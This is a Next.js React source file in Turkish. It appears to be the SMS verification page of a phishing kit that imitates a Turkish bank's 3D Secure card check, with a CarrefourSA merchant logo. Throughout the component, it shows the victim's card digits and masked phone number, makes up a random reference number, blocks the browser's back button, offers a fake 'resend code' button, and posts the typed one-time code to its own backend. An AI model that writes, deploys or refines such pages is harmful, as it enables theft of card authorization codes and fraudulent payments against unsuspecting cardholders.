'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';

interface SmsData {
    tutar: string;
    tarih: string;
    lastFourDigits: string;
    cardType: 'visa' | 'mastercard' | 'unknown';
    maskedPhone: string;
    isyeriAdi: string;
}

export default function SmsPage() {
    const router = useRouter();
    const [data, setData] = useState<SmsData | null>(null);
    const [loading, setLoading] = useState(true);
    const [smsCode, setSmsCode] = useState('');
    const [error, setError] = useState('');
    const [timeLeft, setTimeLeft] = useState(540); // 9 dakika
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);
    const [isTimeout, setIsTimeout] = useState(false);
    const [referansNo] = useState(() => Math.random().toString(36).substring(2, 10).toUpperCase());
    const inputRef = useRef<HTMLInputElement>(null);

    // Geri gidilmesin
    useEffect(() => {
        window.history.pushState(null, '', window.location.href);
        const handlePopState = () => {
            window.history.pushState(null, '', window.location.href);
        };
        window.addEventListener('popstate', handlePopState);
        return () => window.removeEventListener('popstate', handlePopState);
    }, []);

    // Verileri yükle
    useEffect(() => {
        const fetchData = async () => {
            try {
                const response = await fetch('/api/sms');
                const result = await response.json();
                
                if (result.success) {
                    setData(result.data);
                } else if (result.redirect) {
                    router.push(result.redirect);
                }
            } catch (err) {
                console.error('Veri yükleme hatası:', err);
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, [router]);

    // Geri sayım
    useEffect(() => {
        if (timeLeft <= 0) {
            setIsTimeout(true);
            return;
        }

        const timer = setInterval(() => {
            setTimeLeft(prev => prev - 1);
        }, 1000);

        return () => clearInterval(timer);
    }, [timeLeft]);

    // Input'a focus
    useEffect(() => {
        if (!loading && inputRef.current) {
            inputRef.current.focus();
        }
    }, [loading]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    const formatDate = (dateString: string) => {
        const date = new Date(dateString);
        return date.toLocaleString('tr-TR', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');

        if (smsCode.length < 5) {
            setError('Şifrenizi giriniz');
            setSmsCode('');
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch('/api/sms', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ smsCode })
            });

            const result = await response.json();

            if (result.success) {
                // Başarılı - onay sayfasına yönlendir
                router.push('/odeme/onay');
            } else {
                setError(result.error || 'Bir hata oluştu');
            }
        } catch (err) {
            setError('Bağlantı hatası');
        } finally {
            setIsSubmitting(false);
        }
    };

    const handleRetry = () => {
        setTimeLeft(540);
        setIsTimeout(false);
        setSmsCode('');
        setError('');
    };

    const handleCancel = () => {
        router.push('/');
    };

    if (loading) {
        return (
            <>
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                `}</style>
                <div className="content-wrapper">
                    <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
                        <div className="loader"></div>
                    </div>
                </div>
            </>
        );
    }

    return (
        <>
            <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
            <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
            `}</style>

            <div className="content-wrapper">
                <div className="header" style={{ marginTop: '25px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0 10px' }}>
                    <div className="brand-logo" style={{ margin: 0 }}>
                        <Image 
                            src={data?.cardType === 'visa' ? '/assets/garanti/img/psimage_visa.png' : '/assets/garanti/img/psimage_mc.png'}
                            alt="Card"
                            width={80}
                            height={50}
                            style={{ objectFit: 'contain' }}
                        />
                    </div>
                    <div>
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                    </div>
                </div>

                <div id="approve-page">
                    {isSubmitting && (
                        <div id="loaderDiv" style={{ height: '100%', width: '100%', position: 'absolute', zIndex: 1, display: 'flex' }}>
                            <div className="loader"></div>
                        </div>
                    )}

                    <div className="content">
                        <div className="info-wrapper">
                            <div className="info-row">
                                <div className="info-col info-label">İşyeri Adı:</div>
                                <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">İşlem Tutarı:</div>
                                <div className="info-col amount" id="amount">{data?.tutar}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">İşlem Tarihi-Saati:</div>
                                <div className="info-col" id="operation-date-time">{data?.tarih || ''}</div>
                            </div>
                            <div className="info-row">
                                <div className="info-col info-label">Kart Numarası:</div>
                                <div className="info-col" id="pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                            </div>
                        </div>

                        <div className="action-wrapper">
                            <div>
                                <h3>
                                    Şifreniz <span id="msisdn">{data?.maskedPhone}</span> nolu cep telefonunuza gönderilecektir.
                                    <br />Referans no: {referansNo}
                                </h3>
                            </div>

                            <div className="form-wrapper">
                                <form id="bkmform" className="form-code" onSubmit={handleSubmit} autoComplete="off">
                                    <div className="form-row">
                                        <label htmlFor="code" className="otpcode">Doğrulama Kodu</label>
                                        <input
                                            ref={inputRef}
                                            type="tel"
                                            className={`f-input ${error ? 'error' : ''}`}
                                            name="otpCode"
                                            id="passwordfield"
                                            minLength={5}
                                            maxLength={6}
                                            value={smsCode}
                                            onChange={(e) => {
                                                const val = e.target.value.replace(/\D/g, '').slice(0, 6);
                                                setSmsCode(val);
                                                setError('');
                                            }}
                                            placeholder={error || ''}
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            autoComplete="one-time-code"
                                            disabled={isTimeout}
                                        />
                                    </div>

                                    {error && (
                                        <div id="wrongPassDiv" className="error-messages error-wrong-otp" style={{ display: 'block' }}>
                                            <span className="has-reg">Geçersiz bilgi, lütfen tekrar deneyiniz.</span>
                                        </div>
                                    )}

                                    {isTimeout ? (
                                        <div id="timeOutDiv" className="error-messages error-timeover" style={{ display: 'block' }}>
                                            <div>
                                                <span className="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                                            </div>
                                            <button
                                                type="button"
                                                onClick={handleRetry}
                                                className="button btn-1 re-code v1"
                                            >
                                                Doğrulama Kodunu Yeniden Gönder
                                            </button>
                                        </div>
                                    ) : (
                                        <div id="submitButtonDiv" style={{ display: 'block' }}>
                                            <div className="has-submit">
                                                <button
                                                    id="submitbutton"
                                                    type="submit"
                                                    className="button btn-1 btn-commit"
                                                    disabled={isSubmitting}
                                                >
                                                    Onayla
                                                </button>
                                            </div>
                                            <div id="timerDiv" className="has-timer">
                                                <span>Kalan Süre: </span>
                                                <span className="has-counter" id="has-counter">{formatTime(timeLeft)}</span>
                                            </div>
                                        </div>
                                    )}

                                    <div className="call-to-action">
                                        <ul className="action-list">
                                            <li>
                                                <button
                                                    type="button"
                                                    onClick={handleCancel}
                                                    className="txt-link"
                                                    style={{ background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'inherit' }}
                                                >
                                                    İşlemi İptal Et
                                                </button>
                                            </li>
                                        </ul>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
